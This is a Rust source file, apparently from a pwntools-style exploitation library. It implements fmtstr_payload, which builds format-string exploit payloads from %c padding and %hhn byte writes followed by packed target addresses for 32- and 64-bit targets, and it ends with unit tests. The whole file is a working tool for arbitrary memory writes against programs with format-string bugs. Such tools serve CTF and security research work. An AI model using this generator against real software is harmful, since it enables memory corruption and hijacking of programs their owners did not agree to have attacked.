use crate::context::{self, Endian};

pub fn fmtstr_payload(offset: usize, writes: &[(u64, u64)]) -> Vec<u8> {
    let ctx = context::get();
    let word_size = (ctx.bits / 8) as usize;
    let mut byte_writes = Vec::new();

    for (addr, value) in writes {
        let bytes = match ctx.endian {
            Endian::Little => value.to_le_bytes(),
            Endian::Big => value.to_be_bytes(),
        };
        let slice = match ctx.endian {
            Endian::Little => &bytes[..word_size],
            Endian::Big => &bytes[8 - word_size..],
        };
        for (index, byte) in slice.iter().enumerate() {
            byte_writes.push((addr + index as u64, *byte));
        }
    }

    byte_writes.sort_by_key(|(_, byte)| *byte);

    let mut format = Vec::new();
    let mut previous_len = usize::MAX;

    for _ in 0..10 {
        let base_index = offset + format.len().div_ceil(word_size);
        let mut next = String::new();
        let mut printed = 0u16;

        for (index, (_, byte)) in byte_writes.iter().enumerate() {
            let target = *byte as u16;
            let delta = if target >= printed {
                target - printed
            } else {
                256 - printed + target
            };
            if delta > 0 {
                next.push_str(&format!("%{delta}c"));
            }
            next.push_str(&format!("%{}$hhn", base_index + index));
            printed = target;
        }

        let align = (word_size - (next.len() % word_size)) % word_size;
        next.extend(std::iter::repeat_n('A', align));

        if next.len() == previous_len {
            format = next.into_bytes();
            break;
        }

        previous_len = next.len();
        format = next.into_bytes();
    }

    let mut payload = format;
    for (addr, _) in &byte_writes {
        match (word_size, ctx.endian) {
            (8, Endian::Little) => payload.extend_from_slice(&addr.to_le_bytes()),
            (8, Endian::Big) => payload.extend_from_slice(&addr.to_be_bytes()),
            (4, Endian::Little) => payload.extend_from_slice(&(*addr as u32).to_le_bytes()),
            (4, Endian::Big) => payload.extend_from_slice(&(*addr as u32).to_be_bytes()),
            _ => unreachable!(),
        }
    }

    payload
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::context::{self, Arch};

    #[test]
    fn payload_contains_hhn() {
        context::set_arch(Arch::Amd64);
        let payload = fmtstr_payload(6, &[(0x404000, 0x42)]);
        let s = String::from_utf8_lossy(&payload);
        assert!(s.contains("$hhn"));
    }

    #[test]
    fn payload_has_addresses() {
        context::set_arch(Arch::Amd64);
        let addr: u64 = 0x404000;
        let payload = fmtstr_payload(6, &[(addr, 0x41)]);
        assert!(payload.windows(8).any(|w| w == addr.to_le_bytes()));
    }

    #[test]
    fn payload_32bit() {
        context::set_arch(Arch::I386);
        let addr: u64 = 0x0804_a000;
        let payload = fmtstr_payload(1, &[(addr, 0x42)]);
        let s = String::from_utf8_lossy(&payload);
        assert!(s.contains("$hhn"));
        assert!(payload.windows(4).any(|w| w == (addr as u32).to_le_bytes()));
    }

    #[test]
    fn multiple_writes() {
        context::set_arch(Arch::Amd64);
        let payload = fmtstr_payload(6, &[(0x404000, 0x41), (0x404008, 0x42)]);
        let s = String::from_utf8_lossy(&payload);
        assert!(s.matches("$hhn").count() >= 2);
    }
}
